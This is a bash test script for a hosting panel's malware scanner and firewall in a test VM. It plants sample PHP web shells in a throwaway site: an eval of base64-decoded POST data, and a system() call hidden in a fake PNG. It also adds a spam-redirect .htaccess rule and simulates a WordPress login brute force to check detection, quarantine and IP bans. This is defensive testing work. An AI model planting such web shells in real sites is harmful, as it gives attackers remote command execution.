#!/bin/bash
# Shield in the test VM (after dev/vm.sh; edge cut over): plant web shells in a
# PHP site, scan, quarantine/restore, IP reputation lists in the kernel, and a
# WordPress login brute force blocked at the edge.
set -euo pipefail
VM=${VM:-pano-test}
R() { orb -m "$VM" -u root "$@"; }
rpc() {
  local params=${2:-}
  R /opt/pano/bin/pano rpc "$1" "${params:-"{}"}"
}
step() { printf '\n\033[1m== %s\033[0m\n' "$*"; }
SITE=shield.test
ROOT=/srv/pano/sites/$SITE/public

step "a PHP site with a few planted files"
rpc sites.delete "{\"name\":\"$SITE\",\"confirm\":\"$SITE\",\"removeFiles\":true}" >/dev/null 2>&1 || true
rpc sites.createPhp "{\"name\":\"$SITE\",\"domains\":\"$SITE\",\"php_version\":\"8.5\"}" >/dev/null
R mkdir -p "$ROOT/wp-content/uploads/2026" "$ROOT/wp-includes"
R sh -c "cat > $ROOT/wp-includes/class-ok.php" <<'EOF'
<?php function ok($n) { return base64_encode($n); }
EOF
R sh -c "cat > $ROOT/wp-content/uploads/2026/x.php" <<'EOF'
<?php @eval(base64_decode($_POST['z']));
EOF
R sh -c "cat > $ROOT/logo.png" <<'EOF'
GIF89a<?php system($_GET['c']); ?>
EOF
R sh -c "cat > $ROOT/.htaccess" <<'EOF'
RewriteEngine On
RewriteCond %{HTTP_REFERER} (google|bing) [NC]
RewriteRule .* https://spam.example/ [R=302,L]
EOF
R chown -R "site-shield-test:site-shield-test" "$ROOT" 2>/dev/null || R sh -c "chown -R \$(stat -c %U:%G $ROOT) $ROOT"

step "full scan"
rpc shield.scan '{"full":true}'
sleep 3
rpc shield.status | jq -c '.scan.last | {files, found}'
rpc shield.status | jq -r '.findings[] | select(.status == "open") | "\(.severity)\t\(.rule)\t\(.path)"'

step "quarantine the uploads shell: gone from the site, root-only in quarantine"
ID=$(rpc shield.status | jq '.findings[] | select(.rule == "php.eval.decode") | .id')
rpc shield.quarantine "{\"id\":$ID}"
R ls "$ROOT/wp-content/uploads/2026/" | wc -l
R sh -c 'ls -l /var/lib/pano/quarantine/'
step "restore puts it back with its owner"
rpc shield.restore "{\"id\":$ID}"
R stat -c '%U %a %n' "$ROOT/wp-content/uploads/2026/x.php"
printf 'served? %s (edge never runs PHP from uploads)\n' "$(R curl -sk -o /dev/null -w '%{http_code}' --resolve $SITE:443:127.0.0.1 https://$SITE/wp-content/uploads/2026/x.php)"
step "fixed by hand: closes itself on the next scan"
R rm -f "$ROOT/logo.png"
rpc shield.scan '{"full":true}'
sleep 3
rpc shield.status | jq -c '[.findings[] | {rule, status}]'

step "IP reputation lists"
rpc shield.set '{"scan":true,"autoQuarantine":false,"reputation":true,"bruteforce":true}'
sleep 2
rpc shield.status | jq -c .reputation
R sh -c 'nft list set inet pano_shield drop4 | grep -c "/" ; nft list chain inet pano_shield output | grep -E "c2|drop4"'

step "WordPress login brute force from an 'internet' address (network namespace)"
NS() { R ip netns exec wgs "$@"; }
R ip netns del wgs 2>/dev/null || true
R ip link del sh-h 2>/dev/null || true
R ip netns add wgs
R ip link add sh-h type veth peer name sh-c
R ip link set sh-c netns wgs
R nmcli device set sh-h managed no 2>/dev/null || true
R ip addr add 192.168.78.1/24 dev sh-h
R ip link set sh-h up
NS ip addr add 192.168.78.2/24 dev sh-c
NS ip link set sh-c up
hit() { NS curl -sk -o /dev/null -w '%{http_code}' --max-time 3 --resolve "$SITE:443:192.168.78.1" "$@" || true; }
printf 'before: %s\n' "$(hit https://$SITE/)"
for _ in $(seq 25); do hit -d 'log=a&pwd=b' "https://$SITE/wp-login.php" >/dev/null; done
echo "(waiting for the once-a-minute check)"
sleep 65
rpc shield.status | jq -c '.bans'
R grep -c pano_banned /etc/pano/Caddyfile || true
R sh -c 'nft list set inet pano_bans web4 | grep elements || true'
printf 'after : %s (000 = dropped in the kernel)\n' "$(hit https://$SITE/)"

step "clean up"
rpc shield.unban '{"ip":"192.168.78.2"}' || true
printf 'unblocked: %s\n' "$(hit https://$SITE/)"
R ip netns del wgs
R ip link del sh-h 2>/dev/null || true
rpc shield.set '{"scan":false,"autoQuarantine":false,"reputation":false,"bruteforce":false}'
R sh -c 'nft list tables | grep pano_ || true'
